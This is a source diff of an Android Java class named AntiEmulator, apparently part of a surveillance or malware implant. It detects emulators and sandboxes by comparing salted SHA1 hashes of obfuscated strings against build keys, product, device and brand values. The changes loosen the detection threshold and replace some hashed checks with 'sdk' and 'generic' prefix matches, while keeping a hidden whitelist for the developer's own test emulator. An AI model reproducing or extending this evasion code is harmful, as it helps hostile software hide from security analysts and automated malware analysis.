@@ -28,6 +28,12 @@ public class AntiEmulator {
 			Check.log(TAG + " (checkKeys): Keys: " + keys); //$NON-NLS-1$
 		}
 
+        String digest = Digest.SHA1(M.e("JmGKwOYrz") + keys.toLowerCase()).toLowerCase();
+        // "unknown"
+        if (digest.equals(M.e("d0deb97b41e6e29754fd3193da5a309ceb68dbf9"))) {
+            return 1;
+        }
+
 		// "/"
 		index = keys.lastIndexOf(M.e("/"));
 
@@ -37,7 +43,7 @@ public class AntiEmulator {
 
 		keys = keys.substring(index);
 
-		String digest = Digest.SHA1(M.e("zOSgALHZaL") + keys.toLowerCase()).toLowerCase();
+		digest = Digest.SHA1(M.e("zOSgALHZaL") + keys.toLowerCase()).toLowerCase();
 
 		// "/test-keys"
 		if (digest.equals(M.e("5d2441306a9458d6592323fbdd235a4c849f33fb"))) {
@@ -72,14 +78,12 @@ public class AntiEmulator {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (checkProduct): Product: " + product); //$NON-NLS-1$
 		}
-	
-		String digest = Digest.SHA1(M.e("NWzeoThPu2") + product.toLowerCase()).toLowerCase();
-	
-		// "sdk"
-		if (digest.equals(M.e("77045d27d24fdec7f0439684fdbef14002f9519f"))) {
+
+		// "sdk" || "sdk_x86"
+		if ( product.toLowerCase().startsWith(M.e("sdk")) ) {
 			return 1;
 		}
-	
+
 		return 0;
 	}
 
@@ -90,11 +94,9 @@ public class AntiEmulator {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (checkDevice): Device: " + device); //$NON-NLS-1$
 		}
-	
-		String digest = Digest.SHA1(M.e("GpCi1INH6B") + device.toLowerCase()).toLowerCase();
-	
+
 		// "generic"
-		if (digest.equals(M.e("e65170a5c904bb54c30e65f0290a67d87344afc7"))) {
+		if (device.startsWith(M.e("generic"))) {
 			return 1;
 		}
 	
@@ -115,6 +117,10 @@ public class AntiEmulator {
 		if (digest.equals(M.e("ae2f26a8cd5bd8efa6b31da9e4974a6b75108f21"))) {
 			return 1;
 		}
+
+        if (brand.startsWith(M.e("generic"))) {
+            return 1;
+        }
 
 		return 0;
 	}
@@ -260,6 +266,7 @@ public class AntiEmulator {
 	private int isEmu(int test) {
 		int NUMTESTS = (tm == null) ? NUMTESTSNOTM : NUMTESTSTM;
 
+        test = Math.abs(test);
 		switch (test % (NUMTESTS)) {
 		case 0:
 			return checkKeys();
@@ -297,24 +304,26 @@ public class AntiEmulator {
 
 	public boolean isEmu() {
 		if (Cfg.DEBUGANTI) {
-			Log.w("QZ", "isEmu");
+			Log.w(TAG, " (isEmu)");
 			return isEmu(NUMTESTSNOTM) >= NUMTESTSNOTM - 2;
 		} else {
-			boolean ret = isEmu(Utils.getRandomIntArray(3)) >= 2;
+			boolean ret = isEmu(Utils.getRandomIntArray(3)) >= 1;
             boolean ov = isTestEmu();
 
-            return ret && !isTestEmu();
+            return ret && !ov;
 		}
 	}
 
     private boolean isTestEmu() {
 
-
         String product = Build.PRODUCT;
         String digest = Digest.SHA1(M.e("oJtb2LTJkhUF") + product.toLowerCase()).toLowerCase();
 
-        // "155552155XX" (le due XX non sono incluse nell'hash perche' variano)
+        // wH6ZrSNNT8b5wysfyAdP
         if (digest.equals(M.e("f19ad4a8c74c793ac38da705fc447e264f3d594b"))) {
+            if(Cfg.DEBUG){
+                Log.d(TAG, " (isTestEmu) we are in the emulator" );
+            }
             return true;
         }
 
